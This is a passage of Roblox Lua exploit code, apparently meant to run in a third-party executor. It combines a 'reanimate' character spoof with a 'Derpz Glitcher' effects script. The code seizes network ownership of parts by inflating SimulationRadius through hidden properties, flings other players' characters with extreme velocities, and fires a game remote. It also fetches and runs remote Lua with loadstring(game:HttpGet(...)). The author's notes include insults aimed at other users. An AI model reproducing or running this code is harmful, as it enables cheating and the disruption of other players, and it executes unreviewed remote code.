		Joint.C0=C0; Joint.C1=C1
		Joint.Parent=Part0
	end
	for i=0,18 do
		local Attachment=INew("Attachment")
		Attachment.Axis,Attachment.SecondaryAxis=V3new(1,0,0), V3new(0,1,0)
		Insert(Attachments, Attachment)
	end
	for i=0,3 do
		local Limb=INew("Part")
		Limb.Size=V3new(1, 2, 1); Limb.CanCollide=false
		Limb.Parent=Figure
		Insert(Limbs, Limb)
	end
	Limbs[1].Name="Right Arm"; Limbs[2].Name="Left Arm"
	Limbs[3].Name="Right Leg"; Limbs[4].Name="Left Leg"
	local Head=INew("Part")
	Head.Size=V3new(2,1,1)
	Head.Locked=true; Head.CanCollide=false
	Head.Name="Head"
	Head.Parent=Figure
	local Torso=INew("Part")
	Torso.Size=V3new(2, 2, 1)
	Torso.Locked=true; Torso.CanCollide=false
	Torso.Name="Torso"
	Torso.Parent=Figure
	local Root=Torso:Clone()
	Root.Transparency=1
	Root.Name="HumanoidRootPart"
	Root.Parent=Figure
	CreateJoint("Neck", Torso, Head, CFNew(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), CFNew(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0))
	CreateJoint("RootJoint", Root, Torso, CFNew(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), CFNew(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0))
	CreateJoint("Right Shoulder", Torso, Limbs[1], CFNew(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0), CFNew(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0))
	CreateJoint("Left Shoulder", Torso, Limbs[2], CFNew(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0), CFNew(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0))
	CreateJoint("Right Hip", Torso, Limbs[3], CFNew(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0), CFNew(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0))
	CreateJoint("Left Hip", Torso, Limbs[4], CFNew(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0), CFNew(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0))
	local Humanoid=INew("Humanoid")
	Humanoid.DisplayDistanceType=Enum.HumanoidDisplayDistanceType.None
	Humanoid.Parent=Figure
	if not DisScripts then
	local Animator=INew("Animator", Humanoid)
	end
	local HumanoidDescription=INew("HumanoidDescription", Humanoid)
	local HeadMesh=INew("SpecialMesh")
	HeadMesh.Scale=V3new(1.25, 1.25, 1.25)
	HeadMesh.Parent=Head
	local Face=INew("Decal")
	Face.Name="face"
	Face.Texture="http://www.roblox.com/asset/?id=158044781"
	Face.Parent=Head
	local Animate=INew("LocalScript")
	Animate.Name="Animate"
	Animate.Parent=Figure
	local Health=INew("Script")
	Health.Name="Health"
	Health.Parent=Figure
	if DisScripts then
	  Animate.Enabled=false
	  Animate.Disabled=true
	  else 
	  Animate.Enabled=true
	  Animate.Disabled=false
	  end
	Attachments[1].Name="FaceCenterAttachment"; Attachments[1].Position=V3new(0, 0, 0)
	Attachments[2].Name="FaceFrontAttachment"; Attachments[2].Position=V3new(0, 0, -0.6)
	Attachments[3].Name="HairAttachment"; Attachments[3].Position=V3new(0, 0.6, 0)
	Attachments[4].Name="HatAttachment"; Attachments[4].Position=V3new(0, 0.6, 0)
	Attachments[5].Name="RootAttachment"; Attachments[5].Position=V3new(0, 0, 0)
	Attachments[6].Name="RightGripAttachment"; Attachments[6].Position=V3new(0, -1, 0)
	Attachments[7].Name="RightShoulderAttachment"; Attachments[7].Position=V3new(0, 1, 0)
	Attachments[8].Name="LeftGripAttachment"; Attachments[8].Position=V3new(0, -1, 0)
	Attachments[9].Name="LeftShoulderAttachment"; Attachments[9].Position=V3new(0, 1, 0)
	Attachments[10].Name="RightFootAttachment"; Attachments[10].Position=V3new(0, -1, 0)
	Attachments[11].Name="LeftFootAttachment"; Attachments[11].Position=V3new(0, -1, 0)
	Attachments[12].Name="BodyBackAttachment"; Attachments[12].Position=V3new(0, 0, 0.5)
	Attachments[13].Name="BodyFrontAttachment"; Attachments[13].Position=V3new(0, 0, -0.5)
	Attachments[14].Name="LeftCollarAttachment"; Attachments[14].Position=V3new(-1, 1, 0)
	Attachments[15].Name="NeckAttachment"; Attachments[15].Position=V3new(0, 1, 0)
	Attachments[16].Name="RightCollarAttachment"; Attachments[16].Position=V3new(1, 1, 0)
	Attachments[17].Name="WaistBackAttachment"; Attachments[17].Position=V3new(0, -1, 0.5)
	Attachments[18].Name="WaistCenterAttachment"; Attachments[18].Position=V3new(0, -1, 0)
	Attachments[19].Name="WaistFrontAttachment"; Attachments[19].Position=V3new(0, -1, -0.5)
	Attachments[1].Parent=Head; Attachments[2].Parent=Head; Attachments[3].Parent=Head Attachments[4].Parent=Head
	Attachments[5].Parent=Root
	Attachments[6].Parent=Limbs[1]; Attachments[7].Parent=Limbs[1]
	Attachments[8].Parent=Limbs[2]; Attachments[9].Parent=Limbs[2]
	Attachments[10].Parent=Limbs[3]; Attachments[11].Parent=Limbs[4]
	for i=0,7 do Attachments[12 + i].Parent=Torso end
	Figure.Name="GelatekReanimate"
	Figure.PrimaryPart=Head
	Figure.Archivable=true
	Figure.Parent=Workspace
	Figure:MoveTo(RootPart.Position)
end

local FigureHum=Figure:FindFirstChildWhichIsA("Humanoid")
Figure:MoveTo(Character.Head.Position + V3new(0, 2.5, 0))
for i,v in pairs(Figure:GetDescendants()) do
	if v:IsA("BasePart") or v:IsA("Decal") then
		v.Transparency=1
	end
end

local FigureDescendants=Figure:GetDescendants()
local CharacterChildren=Character:GetChildren()

function VoidEvent()
	if AntiVoid == true then
		Figure:MoveTo(SpawnPoint.Position)
	else
		if PostSimEvent then PostSimEvent:Disconnect() end
		if PreSimEvent then PreSimEvent:Disconnect() end
		if DeathEvent then DeathEvent:Disconnect() end
		if TorsoFlingEvent then TorsoFlingEvent:Disconnect() end
		if ResetEvent then ResetEvent:Disconnect() end
		if FakeHats then FakeHats:Destroy() end
		pcall(function()
			CurrentCam.FieldOfView=70
			Global.Stopped=true
			for i,v in pairs(Global.TableOfEvents) do v:Disconnect() end
			Character.Parent=Workspace
			Player.Character=Workspace[Character.Name]
			Humanoid:ChangeState(15)
			if Figure then Figure:Destroy() end
			if TestService:FindFirstChild("ScriptCheck") then
				TestService:FindFirstChild("ScriptCheck"):Destroy()
			end
			Wait(0.125)
			Global.RealChar=nil
			Global.Stopped=false
		end)
	end
end

		
for i,v in pairs(Character:GetDescendants()) do -- Disable Scripts / Accessories
	if v:IsA("BasePart") then
		v.RootPriority=127
		local ClaimInfo=INew("SelectionBox"); do
			ClaimInfo.Adornee=v
			ClaimInfo.Name="ClaimCheck"
			ClaimInfo.Transparency=1
			ClaimInfo.Parent=v
		end
	end
	
	if v:IsA("Motor6D") and v.Name ~= "Neck" then
		v:Destroy()
	end
	
	if v:IsA("Script") then
		v.Disabled=true
	end
	
	if v:IsA("Accessory") then
		local FakeAccessory=v:Clone()
		local Handle=FakeAccessory:FindFirstChild("Handle")
		pcall(function() Handle:FindFirstChildWhichIsA("Weld"):Destroy() end)
		local Weld=INew("Weld"); do
			Weld.Name="AccessoryWeld"
			Weld.Part0=Handle
		end
		local Attachment=Handle:FindFirstChildOfClass("Attachment")
		if Attachment then
			Weld.C0=Attachment.CFrame
			Weld.C1=Figure:FindFirstChild(tostring(Attachment), true).CFrame
			Weld.Part1=Figure:FindFirstChild(tostring(Attachment), true).Parent
		else
			Weld.Part1=Figure:FindFirstChild("Head")
			Weld.C1=CFNew(0,Figure:FindFirstChild("Head").Size.Y / 2,0) * FakeAccessory.AttachmentPoint:Inverse()
		end
		Handle.CFrame=Weld.Part1.CFrame * Weld.C1 * Weld.C0:Inverse()
		Handle.Transparency=1
		Weld.Parent=Handle
		FakeAccessory.Parent=Figure
		local FakeAccessory2=FakeAccessory:Clone()
		FakeAccessory2.Parent=FakeHats
	end
end
for i, v in next, Humanoid:GetPlayingAnimationTracks() do
	v:Stop();
end

if BulletEnabled == true then
	if R15 == false then
		if PermanentDeath == true then
			Character:FindFirstChild("HumanoidRootPart").Name="Bullet"
			BulletInfo={Character:FindFirstChild("Bullet"), Figure:FindFirstChild("HumanoidRootPart"), CF0}
			HatData=nil
		else
			Character:FindFirstChild("Right Leg").Name="Bullet"
			BulletInfo={Character:FindFirstChild("Bullet"), Figure:FindFirstChild("Right Leg"), CF0}
			if Character:FindFirstChild("Robloxclassicred") then
				HatData={Character:FindFirstChild("Robloxclassicred"), Figure:FindFirstChild("Right Leg"), CFAngles(math.rad(90),0,0)}
				Character:FindFirstChild("Robloxclassicred").Handle:FindFirstChild("Mesh"):Destroy()
			else HatData=nil end
		end
	else
		Character:FindFirstChild("LeftUpperArm").Name="Bullet"
		BulletInfo={Character:FindFirstChild("Bullet"), Figure:FindFirstChild("Left Arm"), CFNew(0, 0.4085, 0)}
		if Character:FindFirstChild("SniperShoulderL") then
			HatData={Character:FindFirstChild("SniperShoulderL"), Figure:FindFirstChild("Left Arm"), CFNew(0, 0.5, 0)}
		else HatData=nil end
	end
	if HatData then
		HatData[1].Handle:BreakJoints()
	end
	
	local Bullet=Character:FindFirstChild("Bullet")
	local Highlight=INew("SelectionBox"); do
		local Extra 
		Highlight.Adornee=Bullet
		Highlight.Name="Highlight"
		Highlight.Color3=Color3.fromRGB(255, 0, 0)
		Highlight.Parent=Bullet
		Extra=PreSim:Connect(function()
			if not Figure and Figure.Parent then Extra:Disconnect() end
			if (not TestService:FindFirstChild("ScriptCheck")) or Figure:FindFirstChild("AnimPlayer") then
				Highlight.Transparency=1
			else
				Highlight.Transparency=0
			end
		end)
	end
end

-- Collide Fling
if CollideFling == true then
	if R15 == false then
		local Torso=Character:FindFirstChild("Torso")
		if PermanentDeath == true then
			IGNORETORSOCHECK="adfasdkogpasdfjopghsfdjofipsdjghsfopgjospadgjsaj"
			task.spawn(function()
				Wait(1)
				local BodyAngularVelocity=INew("BodyAngularVelocity")
				BodyAngularVelocity.MaxTorque=V3new(1,1,1) * Infinite
				BodyAngularVelocity.P=math.huge
				BodyAngularVelocity.AngularVelocity=V3new(1950,1950,1950)
				BodyAngularVelocity.Name="TorsoFlinger"
				BodyAngularVelocity.Parent=Character:FindFirstChild("HumanoidRootPart")
			end)
		else
			TorsoFlingEvent=PostSim:Connect(function()
				if FigureHum.MoveDirection.Magnitude < 0.1 then
					Torso.Velocity=Velocity
				elseif FigureHum.MoveDirection.Magnitude > 0.1 then
					Torso.Velocity=V3new(1250,1250,1250)+Velocity
				end
			end)
		end
	else
		local Torso=Character:FindFirstChild("UpperTorso")
		TorsoFlingEvent=PostSim:Connect(function()
			if FigureHum.MoveDirection.Magnitude < 0.1 then
				Torso.RotVelocity=V3new()
			elseif FigureHum.MoveDirection.Magnitude > 0.1 then
				Torso.RotVelocity=V3new(2500,2500,2500)
			end
		end)
	end
end

if not TestService:FindFirstChild("OwnershipBoost") then
	local Part=INew("Part")
	Part.Name="OwnershipBoost"
	Part.Parent=TestService
	PreSim:Connect(function()
		HiddenProps(Player, "MaximumSimulationRadius", 10e+5)
		HiddenProps(Player, "SimulationRadius", Player.MaximumSimulationRadius)
	end)
end
local FallHeight=Workspace.FallenPartsDestroyHeight
function MiniRandom() return "0." .. MathRandom(6, 8) .. MathRandom(1, 9) .. MathRandom(1, 9) end
PreSimEvent=PreSim:Connect(function() -- Noclip
	local AntiVoidOffset=Global.GelatekHubConfig["Anti Void Offset"] or 75
	if Figure.HumanoidRootPart.Position.Y <= FallHeight + AntiVoidOffset then VoidEvent() end
	for _,v in pairs(CharacterChildren) do
		if v:IsA("BasePart") then
			v.CanCollide=false
		end
	end
	
	if not Collisions then
		for _,v in pairs(FigureDescendants) do
			if v:IsA("BasePart") then
				v.CanCollide=false
			end
		end
	end
end)

for i,v in pairs(Character:GetDescendants()) do -- Break Joints
	if v:IsA("Motor6D") and v.Name ~= "Neck" then
		v:Destroy()
	end
end

for i,v in pairs(Character:GetChildren()) do
	if v:IsA("Accessory") then
		local Attachment=v.Handle:FindFirstChildWhichIsA("Attachment")
		if KeepHairWelds == true and Attachment.Name ~= "HatAttachment" and Attachment.Name ~= "FaceFrontAttachment" and Attachment.Name ~= "HairAttachment" and Attachment.Name ~= "FaceCenterAttachment" then
			v.Handle:BreakJoints()
		end
		if KeepHairWelds == false or PermanentDeath == true then -- Overwrites the check if perma is on
			v.Handle:BreakJoints()
		end
	end
end

function Align(Part0, Part1, Offset)
	local CFOffset=Offset or CF0
	local OwnerShip=Part0:FindFirstChild("ClaimCheck")
	if Is_NetworkOwner(Part0) == true then
		if OwnerShip then OwnerShip.Transparency=1 end
		if (CollideFling and Part0.Name ~= IGNORETORSOCHECK) or not CollideFling then 
			Part0.AssemblyLinearVelocity=V3new(MathRandom(-2,2), -30 - MiniRandom(), MathRandom(-2,2)) + FigureHum.MoveDirection * (Part0.Mass * 10)
		end
		if (CollideFling and Part0.Name ~= "HumanoidRootPart") or not CollideFling then Part0.RotVelocity=Part1.RotVelocity end
		Part0.CFrame=Part1.CFrame * CFOffset * CFNew(0.0085 * Cos(Clock() * 10), 0.0085 * Sin(Clock() * 10), 0)
	else
		if OwnerShip then OwnerShip.Transparency=0 end
	end
end

local Offsets;
if not R15 then 
	Offsets={
		["HumanoidRootPart"]={Figure:FindFirstChild("HumanoidRootPart"), CF0},
		["Torso"]={Figure:FindFirstChild("Torso"), CF0},
		["Right Arm"]={Figure:FindFirstChild("Right Arm"), CF0},
		["Left Arm"]={Figure:FindFirstChild("Left Arm"), CF0},
		["Right Leg"]={Figure:FindFirstChild("Right Leg"), CF0},
		["Left Leg"]={Figure:FindFirstChild("Left Leg"), CF0},
	}
else 
	Offsets={
		["UpperTorso"]={Figure:FindFirstChild("Torso"), CFNew(0, 0.194, 0)},
		["LowerTorso"]={Figure:FindFirstChild("Torso"), CFNew(0, -0.79, 0)},
		["HumanoidRootPart"]={Character:FindFirstChild("UpperTorso"), CF0},
		
		["RightUpperArm"]={Figure:FindFirstChild("Right Arm"), CFNew(0, 0.4085, 0)},
		["RightLowerArm"]={Figure:FindFirstChild("Right Arm"), CFNew(0, -0.184, 0)},
		["RightHand"]={Figure:FindFirstChild("Right Arm"), CFNew(0, -0.83, 0)},

		["LeftUpperArm"]={Figure:FindFirstChild("Left Arm"), CFNew(0, 0.4085, 0)},
		["LeftLowerArm"]={Figure:FindFirstChild("Left Arm"), CFNew(0, -0.184, 0)},
		["LeftHand"]={Figure:FindFirstChild("Left Arm"), CFNew(0, -0.83, 0)},

		["RightUpperLeg"]={Figure:FindFirstChild("Right Leg"), CFNew(0, 0.575, 0)},
		["RightLowerLeg"]={Figure:FindFirstChild("Right Leg"), CFNew(0, -0.199, 0)},
		["RightFoot"]={Figure:FindFirstChild("Right Leg"), CFNew(0, -0.849, 0)},

		["LeftUpperLeg"]={Figure:FindFirstChild("Left Leg"), CFNew(0, 0.575, 0)},
		["LeftLowerLeg"]={Figure:FindFirstChild("Left Leg"), CFNew(0, -0.199, 0)},
		["LeftFoot"]={Figure:FindFirstChild("Left Leg"), CFNew(0, -0.849, 0)}
	}
end

local PostSimEvent=PostSim:Connect(function()
	for i,v in pairs(Offsets) do -- Body Align [2]
		if Character:FindFirstChild(i) then
			Align(Character:FindFirstChild(i), v[1], v[2])
		end
	end
	for i,v in pairs(CharacterChildren) do
		if v:IsA("Accessory") then
			if (HatData and v.Name ~= HatData[1].Name) or not HatData then
				Align(v.Handle, Figure[v.Name].Handle)
			end
		end
	end
	if HatData then
		Align(HatData[1].Handle, HatData[2], HatData[3])
	end
	if BulletInfo then
		BulletInfo[1].Velocity=Velocity
		if Global.PartDisconnected == false then
			Align(BulletInfo[1], BulletInfo[2], BulletInfo[3])
		end
	end
end)

-- Permanent Death
if PermanentDeath then
	task.spawn(function()
		Wait(game:FindFirstChildWhichIsA("Players").RespawnTime + 0.5)
		if HeadlessPerma == true then
			Character:FindFirstChild("Head"):Remove()
		else
			Character:FindFirstChild("Head"):BreakJoints()
			Offsets["Head"]={Figure:FindFirstChild("Head"), CF0}
		end
	end)
end

-- Ending Process
Global.RealChar=Character	
Character.Parent=Figure
Player.Character=Figure
CurrentCam.CameraSubject=FigureHum
DeathEvent=FigureHum.Died:Connect(function()
	if PostSimEvent then PostSimEvent:Disconnect() end
	if PreSimEvent then PreSimEvent:Disconnect() end
	if DeathEvent then DeathEvent:Disconnect() end
	if TorsoFlingEvent then TorsoFlingEvent:Disconnect() end
	if ResetEvent then ResetEvent:Disconnect() end
	if FakeHats then FakeHats:Destroy() end
	for i,v in pairs(Global.TableOfEvents) do v:Disconnect() end
	pcall(function()
		CurrentCam.FieldOfView=70
		Global.Stopped=true
		Character.Parent=Workspace
		Player.Character=Workspace[Character.Name]
		Humanoid:ChangeState(15)
		if Figure then Figure:Destroy() end
		if TestService:FindFirstChild("ScriptCheck") then
			TestService:FindFirstChild("ScriptCheck"):Destroy()
		end
		Wait(0.125)
		Global.RealChar=nil
		Global.Stopped=false
	end)
end)

ResetEvent=Character:GetPropertyChangedSignal("Parent"):Connect(function(Parent)
	if Parent == nil then
		if PostSimEvent then PostSimEvent:Disconnect() end
		if PreSimEvent then PreSimEvent:Disconnect() end
		if DeathEvent then DeathEvent:Disconnect() end
		if TorsoFlingEvent then TorsoFlingEvent:Disconnect() end
		if ResetEvent then ResetEvent:Disconnect() end
		if FakeHats then FakeHats:Destroy() end
		for i,v in pairs(Global.TableOfEvents) do v:Disconnect() end
		pcall(function()
			if Figure then Figure:Destroy() end
			CurrentCam.FieldOfView=70
			Global.RealChar=nil
			Global.Stopped=true
			if TestService:FindFirstChild("ScriptCheck") then TestService:FindFirstChild("ScriptCheck"):Destroy() end
			Wait(0.125)
			Global.Stopped=false
		end)
	end
end)

Warn("Reanimated in " .. string.sub(tostring(tick()-Speed),1,string.find(tostring(tick()-Speed),".")+5))
if not DisableAnimations then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatekussy/GelatekReanimate/main/Addons/Animations.lua"))()
end

end

 
Gelatek()
wait(.5)
game.ReplicatedStorage["01_server"]:FireServer("cmd", "-net ")
wait(6)










local ws=workspace 
local go=function(a)
   return game:GetObjects("rbxassetid://"..a)[1]
end
if scr then scr:Destroy() end
local g=100763081082751-- Require script asset id
local name="DG"

local Folder="Saved Requires"
local Path=Folder.."/"..name.." "..g
local j=go(g)
j.Parent=ws 
local script
for i,v in j:GetDescendants() do 
if v:IsA("Script") or v:IsA("ModuleScript") then 
if v.Name=="DG:TFC 0.5.0" then script=v break end
end 
end
getgenv().scr=j

local sval={
   Script=script,
   FeLoadLib=t,
   Character=function() if workspace:FindFirstChild("GelatekReanimate") then return true else return false end  end,
   Char=function() if workspace:FindFirstChild("GelatekReanimate") then return workspace:FindFirstChild("GelatekReanimate") else return false end  end,
}
sval.Script.Effects.DERPZFX.Parent=game:GetService("ReplicatedStorage")


local RepTween = tweenService
plr = game.Players.LocalPlayer
Player = plr
char = sval.Char()
pcalle = pcall
caughterrors = {}
function pcallo(dd)
local eje,errorr = pcalle(dd)
if not eje and not caughterrors[errorr] then
print(errorr)
caughterrors[errorr] = true
end
return eje,errorr
end

pcall = pcallo
cammove = true -------Simple camera movement.

wait(1/60)
warn([[




Derpz Glitcher: The Final Chapter

Started 28/10/2020 5:42 PM
This is the finale for the series. If this ever gets leaked, Please know there will be no more after this. I'm being completely serious with this.
I got bored. I really got bored with this. Please enjoy the final in the derpz glitcher series.
But for now, This is the last one. DGV1, DGV2, DGV3, DGV4 & 4.5, DGV5, DGS, DS, DG:TR, DG:UC, And finally, DG:TFC.



I don't have a very cunning story to add to this glitcher. It's all been kinda explained in the past.



I hope you enjoy.


Yours Sincerely,
Derpz.



By DerpzDeNugget_YT.
EzConvert by Drahazar
Several assets from Lunnekoo, Footplanting (but slightly edited) by Lvnaware.
]])



NOTE_FOR_EDITORS = [[



Heya editors.
Derpz here, Telling you about some stuff you might need to know.
Alot of stuff here nobody really knows. It isn't public as such so... It might be difficult to learn.
Here's some of the new stuff you'll have to get used to.

1. WACKYEFFECT is gone due to me being a skid for it. It's now replaced by my own effect system, DerpzEff which uses Tween.
2. a new chatfunc has been added.
3. Damage functions are different, Though compatible with old versions of MagniDamage, Though there are new MagniDamage types.
4. Rigs and such have been completely changed and you likely won't be able to replicate any of the "2-Player moves" unless you have a rig straight from me.
5. Alot of client replication has took place now, So assets are stored in other scripts.
6. This code is half readable because this is 2020 code.

Other than that, You should be fine. Editors, You're free to go wild with this. Just don't fully claim it as your own unless it's a complete overhaul, AND I MEAN
UTTER AND COMPLETE OVERHAUL, NO REMNANTS OF MY SCRIPTING LEFT, okay? If it is deemed big enough of a change, I'll allow it. If not, I won't allow it.
Oh - And for the editors which love to take my work and twist it into their script so much that it isn't even recognisable anymore... Burn in hell.
OH, AND FOR THE PEOPLE WHO THINK IT'S FUNNY TO MAKE NOT ROBLOX FRIENDLY CONTENT OUT OF MY WORK, YOU SINCERELY DESERVE TO GO BACK TO THE DUMPSTER FIRE YOU BELONG IN.
Assets which I and my friends have made were not meant to be for other people's use without permission. This includes weapons, wings, cores, effects, functions...
The lot. So please. DO NOT Put my items into different scripts. I really condone that and it's been a massive issue recently. I'm looking at you Desmondajayi08...

Other than that...

Thanks!

- Derpz


]]


plr = game:GetService("Players").LocalPlayer
Player = plr
mouse = plr:GetMouse()
cam = game.Workspace.CurrentCamera
cam.CameraType = "Custom"
MorphedInto = "Derpz" --Set to Jake_D if you want to start as Jake_D.
local SoundTable = {

["Melee SFX"] = {

1428541279,
1428541279,
200632136,
199145146,
260430060,
260430079



};
["Melee Swings"] = {
4059009185,
2331617843,
4059010105,
4059010875,
6534717551
};
["Foilage"] = {

};
["Gore Splatter/Crush SFX"] = {
4459571443,
4459571224,
4459572527,

},
["Sword SFX"] = {




};
["ModeChange Explosions"] = {

2770705979,
2011915907,
255679373,
2770705979,
1388740053,
4810729508,
2674547670



};
["Big Explosions"] = {


5519568804,
2648563122,
138210320,



}

}
char = sval.Char()
Character = char
hum = char.Humanoid
Humanoid = hum
t = char.Torso
Torso = t
h = char.Head
Head = h
tors = Torso
lleg = char["Left Leg"]
root = char.HumanoidRootPart
RootPart = root
hed = h
--Make a fake head since for some reason humanoid faces are unintentionally low quality.
fakehed = hed:Clone()
fakehed.Name = "FakeHead"
fakehed.Parent = char
fakehed.Transparency = 1
fakehedweld = Instance.new("Weld",fakehed)
fakehedweld.Part0 = fakehed
fakehedweld.Part1 = hed
rleg = char["Right Leg"]
rarm = char["Right Arm"]
larm = char["Left Arm"]
--Emanuelecaja18's Animation Maker Compatibility
local RightShoulderC0 = CFrame.new(0,0,0)
local LeftShoulderC0 = CFrame.new(0,0,0)
--Emanuelecaja18's Animation Maker Compatibility
Euler = CFrame.fromEulerAnglesXYZ
vt = Vector3.new
it = Instance.new
cf = CFrame.new
Face = fakehed.face
muted = false
local DerpzMusic = Instance.new("Sound",char.Torso)
DerpzMusic.SoundId = "rbxassetid://1609244948"
DerpzMusic.Name = "DerpzMusic"
DerpzMusic.Volume = 2
DerpzMusic.Pitch = 1.03
DerpzMusic.Looped = true
DerpzMusic.RollOffMaxDistance = 300
DerpzMusic:Play()
local sleepymusic = Instance.new("Sound",char.Head)
sleepymusic.SoundId = "rbxassetid://328340676"
sleepymusic.Name = "sleepymusic"
sleepymusic.Volume = 2
sleepymusic.Pitch = 1
sleepymusic.Looped = true
sleepymusic:Play()
sleepymusic:Pause()





--Face changing functions

--Derpz (And some others') Faces
function Bored() --hhh..
Face.Texture = "http://www.roblox.com/asset/?id=4611467856"
end
function Neutral() --okthen
Face.Texture = "rbxassetid://2755423294"
end
function Upset() --cri
Face.Texture = "http://www.roblox.com/asset/?id=4611468085"
end
function Happy() --HHHHHHHHHHHHHHHHHHHHHHHH
Face.Texture = "http://www.roblox.com/asset/?id=4611484914"
end
function Determined() --It'S NOt oVEr uNtIl iT'S OveR
Face.Texture = "rbxassetid://2755480100"
end
function Insane() --hahahhahah
Face.Texture = "http://www.roblox.com/asset/?id=4611467568"
end
function TrulyInsane() --AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Face.Texture = "http://www.roblox.com/asset/?id=5983998994"
end
--http://www.roblox.com/asset/?id=5983998994
function Sleeping() --Yes, I did make a sleeping face.
Face.Texture = "rbxassetid://3009289203"
end
function HappyMemey() --c:
Face.Texture = "rbxassetid://3988001776"
end
function Shocked() --JESUS CHRIST WHAT THE HELL IS THAT DEAD BODY DOING ON THE FLOOR
Face.Texture = "http://www.roblox.com/asset/?id=4365795547"
end
function Smirk() --Hah.
Face.Texture = "http://www.roblox.com/asset/?id=6274257183"
end


--UNUSED FACES, MIGHT COME INTO USE SOON
function Fearful() --I feel a dark essence around me...
Face.Texture = "rbxassetid://2801751305"
end
function Worried() --Uhh... Guys?
Face.Texture = "rbxassetid://2801751773"
end
function Grinning() --this is cursed
Face.Texture = "http://www.roblox.com/asset/?id=3690119837"
end
function ShockedV2() --I mean... Shocked.
Face.Texture = "rbxassetid://2801742053"
end
function WorriedVar2() --...Is anyone there?
Face.Texture = "rbxassetid://2801751501"
end
function Peeved() --OKAY, THAT'S THE LAST TIME YOU'RE TAKING MY CHOCOLATE MILK
Face.Texture = "http://www.roblox.com/asset/?id=3683871931"
end
function PeevedVar2() --*Visible rage*
Face.Texture = "http://www.roblox.com/asset/?id=2663784455"
end
function OriginalRemade() --God.. This is cursed.
Face.Texture = "http://www.roblox.com/asset/?id=2663948411"
end
function BoredStraight() --:|
Face.Texture = "http://www.roblox.com/asset/?id=2620024419"
end
function SmallNeutral() --:| but smaller
Face.Texture = "http://www.roblox.com/asset/?id=2620025632"
end
function Slanted() -- :/
Face.Texture = "http://www.roblox.com/asset/?id=3039451436"
end
function Emotionless() --Legitimately no face, this is morally wrong in every way
Face.Texture = "rbxassetid://0" 
end
--UNUSED FACES, MIGHT COME INTO USE SOON




--Jake_D Faces (If the script is about them)
function JakeNeutral() --meh.
Face.Texture = "rbxassetid://3557021423"
end
function JakeUpset() --u make me mad >:c
Face.Texture = "rbxassetid://3557022030"
end
function JakeHappy() --help
Face.Texture = "rbxassetid://3557022523"
end
--Face changing functions

--Gauntlet stuff

local Gauntlet = script.Gauntlet
local GauntMain = script.Gauntlet.main
local GauntGui = script.Gauntlet.MainGUI.SurfaceGui
local GauntWeld = Instance.new("Weld",Gauntlet)
GauntWeld.Part0 = rarm
GauntWeld.Part1 = GauntMain
GauntWeld.C0 = CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
GauntMain.Anchored = false

local visualae = {}

for i,v in pairs(GauntGui.Frame:GetChildren()) do
if v.Name == "vis" then
table.insert(visualae,v)
end
end

--Gauntlet stuff

--REPLICATION STUFF
local What = script["thingy"].main
local UpdateStuff = script["thingy"].lol

-- for i,v in pairs(game.Players:GetPlayers()) do
-- local e = What:Clone()
-- e.Disabled = false
-- e.Parent = v.Character
-- e.Name = "MainFor"..plr.Name
-- e.RemotePlace.Value = script.thingy.lol
-- e.plrname.Value = plr.Name
-- e.DerpzMusic.Value = char.Torso.DerpzMusic
-- e.GauntGui.Value = script.Gauntlet.MainGUI.SurfaceGui
-- v.CharacterAdded:connect(function(p)
-- local eh = What:Clone()
-- eh.Disabled = false
-- eh.Parent = p
-- eh.Name = "MainFor"..plr.Name
-- eh.RemotePlace.Value = script.thingy.lol
-- eh.plrname.Value = plr.Name
-- eh.DerpzMusic.Value = char.Torso.DerpzMusic
-- eh.GauntGui.Value = script.Gauntlet.MainGUI.SurfaceGui
-- end)
-- end

-- game.Players.PlayerAdded:connect(function(p)
-- p.CharacterAdded:connect(function(v)
-- local e = What:Clone()
-- e.Disabled = false
-- e.Parent = v
-- e.Name = "MainFor"..plr.Name
-- e.RemotePlace.Value = script.thingy.lol
-- e.plrname.Value = plr.Name
-- e.DerpzMusic.Value = char.Torso.DerpzMusic
-- e.GauntGui.Value = script.Gauntlet.MainGUI.SurfaceGui
-- end)
-- end)



--Focus
--note to self i really need to update this. LOL
function Focus(whatone,timebeforeend,twoplayersonly,playerone,playertwo) --Time is used in ticks, Not seconds.
if twoplayersonly == true then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if script.Focus[whatone].Parent ~= nil then
if v.Name == playerone or v.Name == playertwo then
local var = script.Focus[whatone]:Clone()
var.PersonName.Value = plr.Name
var.Time.Value = timebeforeend
var.Parent = v.PlayerGui
var.Disabled = false
else
end
end
end
elseif twoplayersonly == false or twoplayersonly == nil then


for i,v in pairs(game:GetService("Players"):GetChildren()) do
if script.Focus[whatone].Parent ~= nil then
if plr.Name == "DerpzDeNugget_YT" then
local var = script.Focus[whatone]:Clone()
var.PersonName.Value = plr.Name
var.Time.Value = timebeforeend
var.Parent = v.PlayerGui
var.Disabled = false

end
end
end
end
end
--Focus


--Camera Shake
local NewInstance = function(instance,parent,properties)
local inst = Instance.new(instance,parent)
if(properties)then
for i,v in next, properties do
pcall(function() inst[i] = v end)
end
end
return inst;
end
FXFolder=script.Effects
function CamShake2(who,data)
coroutine.wrap(function()
if(FXFolder:FindFirstChild'CamShake')then
local cam = FXFolder.CamShake:Clone()
cam:WaitForChild'intensity'.Value = data.Intensity or 5
cam:WaitForChild'duration'.Value = data.Duration or 5
cam:WaitForChild'speed'.Value = data.Speed or 10;
 if(data.Origin)then NewInstance((typeof(data.Origin) == 'Instance' and "ObjectValue" or typeof(data.Origin) == 'Vector3' and 'Vector3Value' or typeof(data.Origin)=='CFrame' and 'CFrameValue'),cam,{Name='origin',Value=data.Origin}) end
